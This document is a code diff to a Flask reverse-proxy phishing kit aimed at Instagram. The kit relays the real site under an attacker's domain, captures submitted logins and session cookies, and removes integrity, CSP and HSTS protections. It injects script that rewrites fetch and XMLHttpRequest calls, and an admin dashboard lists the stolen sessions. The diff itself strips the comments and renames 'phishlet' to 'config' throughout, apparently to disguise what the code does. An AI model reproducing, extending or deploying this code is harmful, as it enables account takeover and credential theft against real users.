@@ -14,7 +14,7 @@ from flask import (
     redirect, url_for, after_this_request
 )
 
-# تعطيل تحذيرات SSL
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ======================== إعدادات التيليجرام ========================
@@ -26,32 +26,32 @@ app = Flask(__name__, template_folder='templates')
 app.secret_key = os.urandom(32).hex()
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 
-# قواعد البيانات المؤقتة
+
 captured_sessions = {}
 captured_creds = {}
 
-# ======================== تحميل قوالب YAML ========================
+
 class PhishletLoader:
-    def __init__(self, phishlets_dir='phishlets'):
-        self.phishlets_dir = Path(phishlets_dir)
+    def __init__(self, configs_dir='configs'):  
+        self.configs_dir = Path(configs_dir)
         self.phishlets = {}
         self._load_all()
 
     def _load_all(self):
-        if not self.phishlets_dir.exists():
-            logging.warning(f"⚠️ Phishlets directory '{self.phishlets_dir}' not found. Creating empty directory.")
-            self.phishlets_dir.mkdir(exist_ok=True)
+        if not self.configs_dir.exists():
+            logging.warning(f"⚠️ Configs directory '{self.configs_dir}' not found. Creating empty directory.")
+            self.configs_dir.mkdir(exist_ok=True)
             return
-        for yaml_file in self.phishlets_dir.glob('*.yaml'):
+        for yaml_file in self.configs_dir.glob('*.yaml'):
             try:
                 with open(yaml_file, 'r', encoding='utf-8') as f:
                     data = yaml.safe_load(f)
                     if data and 'name' in data:
                         name = data['name']
                         self.phishlets[name] = data
-                        logging.info(f"✅ Loaded phishlet: {name} from {yaml_file.name}")
+                        logging.info(f"✅ Loaded config: {name} from {yaml_file.name}")
                     else:
-                        logging.error(f"❌ Invalid phishlet file (missing 'name'): {yaml_file.name}")
+                        logging.error(f"❌ Invalid config file (missing 'name'): {yaml_file.name}")
             except Exception as e:
                 logging.error(f"❌ Error loading {yaml_file.name}: {e}")
 
@@ -65,13 +65,13 @@ class PhishletLoader:
                 return data
         if self.phishlets:
             first = next(iter(self.phishlets.values()))
-            logging.info(f"ℹ️ No matching phishlet for host '{host}', using default: {first.get('name')}")
+            logging.info(f"ℹ️ No matching config for host '{host}', using default: {first.get('name')}")
             return first
         return None
 
 loader = PhishletLoader()
 
-# ======================== محرك المعالجة ========================
+
 class PhishletEngine:
     def __init__(self, phishlet_config):
         self.config = phishlet_config
@@ -158,7 +158,7 @@ class PhishletEngine:
             for cookie in cookies_jar:
                 cookies_dict[cookie.name] = cookie.value
 
-        # قائمة الكوكيز الأساسية التي تضمن صلاحية الجلسة (مستوحاة من المحادثة)
+   
         essential_cookies = ['sessionid', 'ds_user_id', 'csrftoken', 'rur']
         has_essential = all(k in cookies_dict for k in essential_cookies)
 
@@ -182,6 +182,7 @@ class PhishletEngine:
             return session_id
         return None
 
+
     def rewrite_content(self, content, content_type, current_host):
         if not content_type or not any(t in content_type.lower() for t in ['text/html', 'application/javascript', 'text/css', 'application/json']):
             return content
@@ -189,41 +190,32 @@ class PhishletEngine:
             if isinstance(content, bytes):
                 content = content.decode('utf-8', errors='ignore')
             
-            # قائمة موسعة بالنطاقات
-            all_domains = ['instagram.com', 'cdninstagram.com', 'fbcdn.net']
-            for domain in all_domains:
-                # https://any.sub.domain
-                content = re.sub(rf'https?://(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}', f'https://{current_host}', content)
-                # //any.sub.domain
-                content = re.sub(rf'//(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}', f'//{current_host}', content)
-                # داخل علامات الاقتباس (لـ JSON/JS)
-                content = re.sub(rf'(["''])(?:[a-zA-Z0-9-]+\.)*{re.escape(domain)}(["''])', rf'\1{current_host}\2', content)
-                # استبدال النقاط المهربة
-                content = content.replace(domain.replace('.', r'\.'), current_host.replace('.', r'\.'))
+            
+            content = re.sub(rf'https?://(?:[a-zA-Z0-9-]+\.)*(?:instagram\.com|cdninstagram\.com|fbcdn\.net)', f'https://{current_host}', content)
+            content = re.sub(rf'//(?:[a-zA-Z0-9-]+\.)*(?:instagram\.com|cdninstagram\.com|fbcdn\.net)', f'//{current_host}', content)
+            content = re.sub(rf'(["''])(?:[a-zA-Z0-9-]+\.)*(?:instagram\.com|cdninstagram\.com|fbcdn\.net)(["''])', rf'\1{current_host}\2', content)
+            
 
-            # إزالة الحمايات
             content = re.sub(r'integrity="[^"]+"', '', content)
             content = re.sub(r'<meta[^>]*http-equiv=["\']Content-Security-Policy["\'][^>]*>', '', content)
             content = content.replace('Content-Security-Policy', 'X-Ignored-CSP')
 
-            # حقن سكريبت متطور لاعتراض طلبات XMLHttpRequest و fetch
+     
             if '<head>' in content:
                 script = f"""<script>
                 (function() {{
                     const currentHost = '{current_host}';
-                    const domains = {json.dumps(all_domains)};
+                    const domains = ['instagram.com', 'cdninstagram.com', 'fbcdn.net'];
                     const fixUrl = (url) => {{
                         if (typeof url !== 'string') return url;
                         domains.forEach(d => url = url.replace(new RegExp('https?://([a-zA-Z0-9-]+\.)*' + d.replace(/\./g, '\\.'), 'g'), 'https://' + currentHost));
                         return url;
                     }};
-                    // اعتراض XMLHttpRequest
                     const orgOpen = XMLHttpRequest.prototype.open;
                     XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {{
                         arguments[1] = fixUrl(url);
                         return orgOpen.apply(this, arguments);
                     }};
-                    // اعتراض fetch
                     const orgFetch = window.fetch;
                     window.fetch = function(url, options) {{
                         url = fixUrl(url);
@@ -232,18 +224,13 @@ class PhishletEngine:
                 }})();
                 </script>"""
                 content = content.replace('<head>', f'<head>{script}')
-            
-            # حقن JavaScript المخصص من ملف YAML إذا وجد
-            elif self.js_inject and '<head>' in content:
-                injection = f"<script>{self.js_inject}</script>"
-                content = content.replace('<head>', f'<head>{injection}')
 
             return content.encode('utf-8')
         except Exception as e:
             logging.error(f"Rewrite error: {e}")
             return content
 
-# ======================== إشعار الزيارة ========================
+
 @app.before_request
 def check_visit():
     if request.path == '/' and 'visited' not in request.cookies:
@@ -256,7 +243,7 @@ def check_visit():
             response.set_cookie('visited', '1', max_age=3600)
             return response
 
-# ======================== المسارات الإدارية ========================
+
 @app.route('/admin/dashboard')
 def admin_dashboard():
     try:
@@ -291,36 +278,39 @@ def clear_sessions():
     captured_creds.clear()
     return redirect(url_for('admin_dashboard'))
 
-# ======================== الوكيل العكسي الرئيسي ========================
+
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
 def proxy(path):
     host = request.headers.get('Host', '').split(':')[0]
     phishlet_config = loader.detect_phishlet(host)
     if not phishlet_config:
-        return "No phishlet configured for this host", 404
+        return "No config found for this host", 404
     engine = PhishletEngine(phishlet_config)
 
-    # بناء URL الهدف
+
     base_url = f"https://{engine.target_domain}"
     target_url = urljoin(base_url, path)
     if request.query_string:
         target_url += '?' + request.query_string.decode('utf-8')
 
-    # تجهيز الرؤوس مع إضافة هيدرات إنستجرام الضرورية (تحسين من المحادثة)
-    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'content-length', 'accept-encoding', 'connection']}
-    headers['Host'] = engine.target_domain
-    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-    headers['Accept-Encoding'] = 'identity'  # تعطيل الضغط
-    headers['Referer'] = f"https://{engine.target_domain}/"
-    headers['Origin'] = f"https://{engine.target_domain}"
-    # هيدرات خاصة بإنستجرام (مهمة جداً)
-    if 'X-Csrftoken' in request.headers:
-        headers['X-CSRFToken'] = request.headers['X-Csrftoken']
-    headers['X-Instagram-AJAX'] = '1'
-    headers['X-Requested-With'] = 'XMLHttpRequest'
 
-    # التقاط بيانات POST
+    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'content-length', 'accept-encoding', 'connection']}
+    headers.update({
+        'Host': engine.target_domain,
+        'Origin': f'https://{engine.target_domain}',
+        'Referer': f'https://{engine.target_domain}/',
+        'X-Instagram-AJAX': '1',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Accept-Language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept-Encoding': 'identity'
+    })
+    
+    if 'csrftoken' in request.cookies:
+        headers['X-CSRFToken'] = request.cookies['csrftoken']
+
+    
     captured_creds_data = None
     if request.method == 'POST' and request.form:
         captured_creds_data = engine.capture_creds(request.form.to_dict())
@@ -337,7 +327,7 @@ def proxy(path):
             timeout=30
         )
 
-        # معالجة التوجيهات
+        
         if resp.status_code in [301, 302, 303, 307, 308]:
             location = resp.headers.get('Location', '')
             if location:
@@ -355,19 +345,19 @@ def proxy(path):
                     proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
                 return proxy_resp
 
-        # معالجة المحتوى العادي
+        
         content = engine.rewrite_content(resp.content, resp.headers.get('Content-Type', ''), host)
         proxy_resp = make_response(content)
         proxy_resp.status_code = resp.status_code
 
-        # نسخ الرؤوس مع استبعاد الرؤوس الضارة
+        
         excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding',
                             'strict-transport-security', 'content-security-policy', 'x-frame-options']
         for n, v in resp.headers.items():
             if n.lower() not in excluded_headers:
                 proxy_resp.headers[n] = v
 
-        # نقل الكوكيز
+        
         for cookie_name, cookie_value in resp.cookies.items():
             proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
 
